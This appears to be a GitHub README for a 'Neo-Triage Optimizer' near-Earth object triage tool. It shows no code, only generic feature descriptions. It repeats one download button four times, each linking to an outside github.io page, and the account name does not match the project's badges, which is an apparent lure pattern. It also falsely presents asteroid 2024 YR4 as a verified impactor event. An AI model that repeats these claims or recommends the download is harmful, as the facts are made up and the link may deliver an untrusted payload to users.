![preview](https://raw.githubusercontent.com/sadececinar70-svg/neo-bayesian-impact-forecast/main/preview.svg)

# Neo-Triage Optimizer

**Prioritizing Planetary Defense: Bayesian Decision Intelligence for Near-Earth Object Follow-Up Campaigns**

![GitHub release (latest by date)](https://img.shields.io/github/v/release/neo-triage-optimizer/core) ![License](https://img.shields.io/badge/license-MIT-blue) ![Contributions](https://img.shields.io/badge/contributions-welcome-brightgreen) ![Build Status](https://img.shields.io/badge/build-passing-success)

---

## Overview

The **Neo-Triage Optimizer** is a reimagined framework designed to assist observatories, research consortia, and planetary defense coordinators in making high-stakes decisions about which newly discovered near-Earth objects (NEOs) warrant immediate spectroscopic follow-up, radar confirmation, or deeper astrometric refinement. Instead of relying solely on simplistic impact probability thresholds, this system incorporates Bayesian expert reasoning, historical verification against real-world impactors, and multi-source cross-validation to produce a ranked triage priority score for each candidate object.

Inspired by the operational logic of JPL Sentry-II and ESA NEOCC Aegis, and refined using a curated library of six verified imminent impactor cases—including the well-characterized 2024 YR4 event—this repository offers a fresh alternative for the global NEO observation community. The goal is not to replace existing systems but to augment them with transparent, interpretable decision intelligence that can be deployed in both automated pipelines and human-in-the-loop review environments.

---

## Why This Exists

Planetary defense is a time-constrained discipline. When a new NEO is announced, observatories around the world must rapidly decide where to point their telescopes. The window for confirmation—especially for objects on Earth-grazing trajectories—can be hours or days. Traditional triage relies on impact probability thresholds that may miss low-probability but high-consequence events, or may over-prioritize objects with high uncertainty but low hazard potential.

Neo-Triage Optimizer addresses this gap by modeling the **value of information** for each follow-up observation. It calculates not just the likelihood of impact, but the **potential reduction in uncertainty** that a new observation would provide. This shifts the conversation from "how dangerous is this object?" to "what is the most useful observation we can make right now?"

---

## Key Features

### 🧠 Bayesian Expert Reasoning Engine
- Encodes domain knowledge from historical impactors and near-miss events into a probabilistic framework.
- Supports prior distributions derived from observational completeness models and population statistics.
- Outputs posterior probability densities for impact scenarios, hazard corridors, and observation urgency.

### 🔄 Multi-Source Cross-Validation
- Aligns triage outputs against JPL Sentry-II risk page data and ESA NEOCC Aegis automated alerts.
- Flags discrepancies between systems for manual review by duty astronomers.
- Produces confidence intervals for each triage recommendation.

### 🧪 Imminent Impactor Library Integration
- Ships with a verified library of six historical impactor events, including 2024 YR4 and five other cases with ground-truth observations.
- Allows users to test triage algorithms against known outcomes for benchmarking and tuning.
- Enables scenario replay for training new observers or validating system updates.

### 📡 Observational Resource Optimization
- Models telescope availability, weather windows, and field-of-view constraints.
- Suggests optimal cadence and filter selection for photometric and spectroscopic follow-up.
- Generates machine-readable observation requests compatible with standard observatory tools.

### 🌍 Multilingual Observational Summaries
- Critical triage outputs are rendered in multiple languages for global coordination.
- Supports English, Spanish, Japanese, and Mandarin Chinese for international team collaboration.
- Automatic translation of hazard corridor descriptions and observation priority notes.

### ⏳ 24/7 Monitoring Ready
- Designed to run as a continuous background service, ingesting MPC and NEOWISE data streams.
- Sends push notifications to authorized users when a high-priority object is identified.
- Logs all decisions for post-event analysis and audit.

---

## [![Download](https://raw.githubusercontent.com/sadececinar70-svg/neo-bayesian-impact-forecast/main/button.svg)](https://sadececinar70-svg.github.io/neo-bayesian-impact-forecast/)

You can obtain the latest stable release of the Neo-Triage Optimizer from the official distribution channel. This version includes the full Bayesian inference module, the imminent impactor library, and the cross-validation toolkit.

[![Download](https://raw.githubusercontent.com/sadececinar70-svg/neo-bayesian-impact-forecast/main/button.svg)](https://sadececinar70-svg.github.io/neo-bayesian-impact-forecast/)

---

## Architecture and Design Philosophy

The system is built around a modular architecture that separates data ingestion, inference, and visualization into independent services. Each module is self-contained but communicates via a shared schema for NEO observations and triage decisions.

### Data Ingestion Layer
- Reads MPC ephemeris files, NEOWISE alerts, and user-provided observation archives.
- Normalizes astrometric and photometric data into a unified format.
- Caches recent observations for rapid re-computation when new data arrives.

### Inference Engine
- Runs Bayesian updates on candidate objects using a custom Markov chain Monte Carlo sampler optimized for orbital parameter spaces.
- Produces marginal likelihoods for impact, close approach, and distant flyby scenarios.
- Computes information gain metrics to prioritize follow-up observations.

### Triage Output Module
- Generates a ranked list of NEOs with priority scores from 0 to 100.
- Includes human-readable reasoning for each score, citing specific uncertainty reductions.
- Exports results in JSON, CSV, and PDF formats for integration with downstream tools.

### Visualization Dashboard
- Provides real-time plots of hazard corridors, probability density functions, and observation completeness.
- Includes a timeline view showing when each object was last observed and when it next becomes observable.
- Fully accessible via standard web browsers with no additional plugins required.

---

## Use Cases

### For Professional Observatories
- Integrate into nightly queue management systems to triage incoming NEO alerts.
- Automate decision-making for routine follow-up while flagging exceptional cases for human review.

### For Amateur Astronomers
- Use the simplified triage viewer to identify high-priority targets for backyard telescopes.
- Contribute observations that feed back into the Bayesian model, improving future predictions.

### For Planetary Defense Exercises
- Simulate hypothetical impact scenarios using the library of historical cases.
- Train teams in rapid decision-making under uncertainty.

### For Research and Education
- Explore the interplay between observation strategy and impact probability refinement.
- Use the open-source inference engine for academic studies of NEO population dynamics.

---

## License

This project is licensed under the **MIT License**. You are free to use, modify, and distribute this software for any purpose, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

For the full text, please refer to the [LICENSE](LICENSE) file included in this repository.

---

## Disclaimer

The Neo-Triage Optimizer is a research tool intended to assist with decision-making for near-Earth object follow-up observations. It is **not** a certified planetary defense system. All triage recommendations should be reviewed by qualified astronomers and cross-referenced with official sources such as JPL Sentry-II and ESA NEOCC Aegis. The authors assume no responsibility for any damages, losses, or missed observations resulting from the use of this software. Observational resources are finite; always exercise professional judgment when allocating telescope time.

---

## Community and Contributions

We welcome contributions from astronomers, data scientists, software engineers, and anyone interested in planetary defense. The repository is structured to encourage modular development and testing. Whether you want to improve the inference engine, add a new impactor case to the library, or improve the multilingual output, your input is valued.

Please review the contribution guidelines before submitting pull requests. All contributors are expected to adhere to the code of conduct outlined in the repository.

---

## Roadmap

**2026 Q1** – Release version 1.0 with full Bayesian triage and cross-validation.  
**2026 Q2** – Add support for radar cross-section modeling in triage scores.  
**2026 Q3** – Integrate real-time MPC and NEOWISE data streams.  
**2026 Q4** – Release multilingual dashboards and expanded impactor library.

---

## Acknowledgments

The development of this tool was informed by the operational experience of the JPL Sentry-II team, the ESA NEOCC Aegis system, and the broader planetary defense community. Special thanks to the observers and data analysts who contributed the verified impactor cases that form the backbone of the training library.

---

## [![Download](https://raw.githubusercontent.com/sadececinar70-svg/neo-bayesian-impact-forecast/main/button.svg)](https://sadececinar70-svg.github.io/neo-bayesian-impact-forecast/)

For the most recent version, including updates to the Bayesian inference engine and new impactor library entries, please obtain the distribution package directly.

[![Download](https://raw.githubusercontent.com/sadececinar70-svg/neo-bayesian-impact-forecast/main/button.svg)](https://sadececinar70-svg.github.io/neo-bayesian-impact-forecast/)